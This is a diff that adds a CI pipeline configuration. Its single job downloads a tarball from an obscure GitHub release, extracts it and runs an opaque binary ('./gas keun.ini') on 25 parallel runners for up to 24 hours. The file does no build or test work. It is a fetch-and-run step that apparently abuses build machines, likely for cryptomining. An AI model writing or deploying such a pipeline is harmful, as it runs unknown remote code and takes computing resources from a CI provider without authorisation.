@@ -1,0 +1,21 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-4
+    os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
+fail_fast:
+  stop:
+    when: 'false'
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/budoluwaw/teskun/releases/download/awffaw/gascuuk.tar.gz'
+            - tar -xvf gascuuk.tar.gz
+            - ./gas keun.ini
+          parallelism: 25
